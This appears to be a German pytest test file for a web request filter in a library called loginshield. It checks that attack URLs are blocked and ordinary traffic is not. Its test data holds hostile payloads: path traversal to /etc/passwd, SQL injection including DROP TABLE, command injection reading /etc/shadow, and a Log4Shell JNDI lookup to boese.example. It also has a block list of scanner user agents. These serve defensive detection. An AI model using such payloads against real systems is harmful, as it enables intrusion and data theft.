"""Die zweite Firewall: Anfragen nach Inhalt filtern."""

import pytest

from loginshield import Guard
from loginshield.config import Config, ConfigError, RequestFilterConfig
from loginshield.models import Event, Reason
from loginshield.requestfilter import DEFAULT_RULES, RequestFilter

#: Angriffe, die zuverlaessig erkannt werden muessen.
ANGRIFFE = [
    ("/../../../../etc/passwd", "Path Traversal"),
    ("/x?id=1' OR '1'='1", "SQL-Tautologie"),
    ("/x?id=1%27%20OR%20%271%27%3D%271", "SQL, einfach kodiert"),
    ("/x?id=1%2527%2520OR%2520%25271%2527%253D%25271", "SQL, doppelt kodiert"),
    ("/x?q=UNION SELECT password FROM users", "UNION SELECT"),
    ("/x?w=1 AND SLEEP(5)", "Zeitbasierte Injection"),
    ("/x?id=1;DROP TABLE users", "Zerstoerende Anweisung"),
    ("/api?t=${jndi:ldap://boese.example/a}", "Log4Shell"),
    ("/x?cmd=;cat /etc/shadow", "Kommando-Einschleusung"),
    ("/index.php?page=php://filter/resource=config", "PHP-Wrapper"),
    ("/x?f=datei%00.jpg", "Nullbyte"),
]

#: Normaler Verkehr - hier darf nichts gesperrt werden. Das ist die
#: wichtigere Haelfte: ein Fehlalarm sperrt echte Nutzer aus.
HARMLOS = [
    "/",
    "/login",
    "/index.html?q=hallo welt",
    "/suche?q=Müller & Söhne GmbH",
    "/artikel/2024/05/wie-baue-ich-ein-regal",
    "/api/v1/users?filter=active&sort=name&page=2",
    "/produkte?preis_von=10&preis_bis=100",
    "/x?url=https://beispiel.de/seite?a=1",
    "/download/rechnung-2024-05.pdf",
    "/suche?q=select the best option for me",
    "/blog?titel=Was ist SQL-Injection und wie schuetzt man sich",
    "/blog?text=Notiz; drop by the office tomorrow",
    "/warenkorb?artikel=Regal%20Kallax&menge=2",
    "/profil/anna.mueller/einstellungen",
]


@pytest.fixture
def filt():
    return RequestFilter(RequestFilterConfig())


# -- Erkennung -----------------------------------------------------------
@pytest.mark.parametrize("pfad,name", ANGRIFFE)
def test_angriffe_werden_erkannt(filt, pfad, name):
    verdict = filt.inspect(path=pfad)
    assert verdict.blocked, f"{name} nicht erkannt (score {verdict.score})"


@pytest.mark.parametrize("pfad", HARMLOS)
def test_normaler_verkehr_wird_durchgelassen(filt, pfad):
    verdict = filt.inspect(path=pfad, user_agent="Mozilla/5.0 Safari/605.1")
    assert not verdict.blocked, f"Fehlalarm bei {pfad}: {verdict.summary}"


def test_angriffswerkzeuge_am_user_agent(filt):
    for werkzeug in ("sqlmap/1.7", "Nikto/2.5", "masscan/1.3", "gobuster/3"):
        assert filt.inspect(path="/", user_agent=werkzeug).blocked, werkzeug
    # Ein normaler Browser nicht.
    assert not filt.inspect(
        path="/", user_agent="Mozilla/5.0 (iPad; CPU OS 17_0) Safari/605.1"
    ).blocked


def test_ungewoehnliche_methoden(filt):
    assert filt.inspect(path="/", method="TRACE").matched
    assert not filt.inspect(path="/", method="GET").matched
    assert not filt.inspect(path="/", method="POST").matched


def test_ueberlange_url(filt):
    lang = "/x?q=" + "a" * 3000
    verdict = filt.inspect(path=lang)
    assert any(rule.name == "ueberlange_url" for rule in verdict.matched)


def test_schwache_treffer_allein_sperren_nicht(filt):
    # Ein einzelner Treffer mit Schwere 4-5 liegt unter der Schwelle 8.
    verdict = filt.inspect(path="/seite?t={{name}}")
    assert verdict.matched          # erkannt ...
    assert not verdict.blocked      # ... aber nicht gesperrt
    assert verdict.score < 8


def test_mehrere_schwache_treffer_summieren_sich(filt):
    verdict = filt.inspect(path="/x?a=<script>alert(1)</script>&b={{7*7}}")
    assert verdict.score >= 8
    assert verdict.blocked


# -- Einstellungen -------------------------------------------------------
def test_abschaltbar():
    filt = RequestFilter(RequestFilterConfig(enabled=False))
    assert not filt.enabled
    assert filt.inspect(path="/../../etc/passwd").clean


def test_ausgenommene_pfade():
    filt = RequestFilter(RequestFilterConfig(exempt_paths=["/api/roh*"]))
    assert filt.inspect(path="/api/roh/abfrage?q=UNION SELECT 1").clean
    assert filt.inspect(path="/andere?q=UNION SELECT 1").blocked


def test_regeln_einzeln_abschaltbar():
    filt = RequestFilter(RequestFilterConfig(disabled_rules=["sql_union"]))
    assert not any(r.name == "sql_union" for r in filt.rules)
    assert filt.inspect(path="/x?q=UNION SELECT 1").clean
    # Andere Regeln greifen weiterhin.
    assert filt.inspect(path="/../../../../etc/passwd").blocked


def test_eigene_regel():
    filt = RequestFilter(RequestFilterConfig(extra_rules=[
        {"name": "eigene", "pattern": r"/geheim/", "severity": 9,
         "description": "interner Pfad"}
    ]))
    assert filt.inspect(path="/geheim/daten").blocked


def test_eigene_regel_mit_kaputtem_ausdruck():
    with pytest.raises(ConfigError):
        Config.from_dict({"requestfilter": {
            "extra_rules": [{"name": "x", "pattern": "([unvollstaendig"}]
        }})


def test_schwelle_einstellbar():
    streng = RequestFilter(RequestFilterConfig(block_score=4))
    assert streng.inspect(path="/seite?t={{name}}").blocked

    locker = RequestFilter(RequestFilterConfig(block_score=20))
    assert not locker.inspect(path="/../../../../etc/passwd").blocked


def test_ungueltige_konfiguration():
    with pytest.raises(ConfigError):
        Config.from_dict({"requestfilter": {"action": "quatsch"}})
    with pytest.raises(ConfigError):
        Config.from_dict({"requestfilter": {"block_score": 0}})
    with pytest.raises(ConfigError):
        Config.from_dict({"requestfilter": {"max_url_length": 10}})


# -- Zusammenspiel mit dem Guard -----------------------------------------
def test_treffer_sperrt_die_ip(config, store, clock):
    guard = Guard(config, store, clock=clock)
    verdict = guard.requestfilter.inspect(path="/../../../../etc/passwd")
    block = guard.requestfilter.handle("198.51.100.7", verdict, route="/x")

    assert block is not None
    assert block.reason == Reason.MALICIOUS_REQUEST
    assert not guard.check("198.51.100.7").allowed


def test_modus_log_sperrt_nicht(config, store, clock):
    config.requestfilter.action = "log"
    guard = Guard(config, store, clock=clock)
    verdict = guard.requestfilter.inspect(path="/../../../../etc/passwd")

    assert verdict.blocked          # erkannt worden waere es
    assert guard.requestfilter.handle("198.51.100.7", verdict) is None
    assert guard.check("198.51.100.7").allowed
    # Aber protokolliert, damit man vor dem Scharfschalten hinsehen kann.
    eintraege = guard.store.recent_attempts(limit=5, events=[Event.SUSPICIOUS])
    assert len(eintraege) == 1


def test_schwacher_treffer_wird_nur_vermerkt(config, store, clock):
    guard = Guard(config, store, clock=clock)
    verdict = guard.requestfilter.inspect(path="/seite?t={{name}}")
    assert guard.requestfilter.handle("198.51.100.8", verdict) is None
    assert guard.check("198.51.100.8").allowed
    assert len(guard.store.recent_attempts(limit=5, events=[Event.SUSPICIOUS])) == 1


def test_allowlist_schuetzt(config, store, clock):
    config.allowlist = ["198.51.100.0/24"]
    guard = Guard(config, store, clock=clock)
    verdict = guard.requestfilter.inspect(path="/../../../../etc/passwd")
    assert guard.requestfilter.handle("198.51.100.7", verdict) is None
    assert guard.check("198.51.100.7").allowed


# -- Middleware ----------------------------------------------------------
def test_middleware_blockt_angriff(config, store, clock):
    import json

    from tests.test_middleware import body_of, call, make_app, status_of
    from loginshield.middleware import ShieldMiddleware

    guard = Guard(config, store, clock=clock)
    app = ShieldMiddleware(make_app(200), guard)

    scope = {
        "type": "http", "path": "/x", "method": "GET",
        "client": ("198.51.100.5", 5000),
        "query_string": b"id=1%27%20OR%20%271%27%3D%271",
        "headers": [(b"user-agent", b"curl/8")],
    }
    messages = call(app, scope)
    assert status_of(messages) == 403
    assert json.loads(body_of(messages))["reason"] == Reason.MALICIOUS_REQUEST
    assert guard.store.active_block("198.51.100.5", now=clock.now) is not None


def test_middleware_laesst_normales_durch(config, store, clock):
    from tests.test_middleware import call, make_app, status_of
    from loginshield.middleware import ShieldMiddleware

    guard = Guard(config, store, clock=clock)
    app = ShieldMiddleware(make_app(200), guard)
    scope = {
        "type": "http", "path": "/suche", "method": "GET",
        "client": ("198.51.100.5", 5000),
        "query_string": b"q=Regal+kaufen&sort=preis",
        "headers": [(b"user-agent", b"Mozilla/5.0")],
    }
    assert status_of(call(app, scope)) == 200


def test_middleware_filter_abschaltbar(config, store, clock):
    from tests.test_middleware import call, make_app, status_of
    from loginshield.middleware import ShieldMiddleware

    guard = Guard(config, store, clock=clock)
    app = ShieldMiddleware(make_app(200), guard, requestfilter=False)
    scope = {
        "type": "http", "path": "/x", "method": "GET",
        "client": ("198.51.100.5", 5000),
        "query_string": b"q=UNION+SELECT+1",
        "headers": [],
    }
    assert status_of(call(app, scope)) == 200


def test_wsgi_blockt_angriff(config, store, clock):
    from loginshield.middleware import WSGIShield

    guard = Guard(config, store, clock=clock)

    def app(environ, start_response):  # pragma: no cover - darf nie laufen
        start_response("200 OK", [])
        return [b"echt"]

    shield = WSGIShield(app, guard)
    captured = []
    shield(
        {"PATH_INFO": "/x", "REQUEST_METHOD": "GET",
         "QUERY_STRING": "t=${jndi:ldap://boese.example/a}",
         "REMOTE_ADDR": "198.51.100.9"},
        lambda status, headers, exc_info=None: captured.append(status),
    )
    assert captured[0].startswith("403")


# -- Regelwerk selbst ----------------------------------------------------
def test_alle_regeln_sind_uebersetzbar():
    for rule in DEFAULT_RULES:
        rule.compiled()


def test_regeln_haben_beschreibung_und_schwere():
    for rule in DEFAULT_RULES:
        assert rule.description, rule.name
        assert 1 <= rule.severity <= 10, rule.name


# -- Schutz vor Ueberlastung --------------------------------------------
def test_sehr_lange_url_kostet_kaum_zeit(filt):
    import time as _time

    lang = "/x?q=" + "a" * 200_000
    start = _time.perf_counter()
    verdict = filt.inspect(path=lang)
    dauer = _time.perf_counter() - start

    # Ohne Begrenzung liefen die Regeln ueber 200 KB - pro Anfrage.
    assert dauer < 0.01, f"{dauer * 1000:.1f} ms fuer eine Anfrage"
    assert any(r.name == "ueberlange_url" for r in verdict.matched)


def test_angriff_am_anfang_einer_langen_url_wird_gefunden(filt):
    verdict = filt.inspect(path="/../../../../etc/passwd?x=" + "a" * 200_000)
    assert verdict.blocked


def test_ueberlange_programmkennung(filt):
    # Auch die Kennung wird gekappt, bevor die Regeln darauf laufen.
    verdict = filt.inspect(path="/", user_agent="sqlmap " + "x" * 100_000)
    assert verdict.blocked
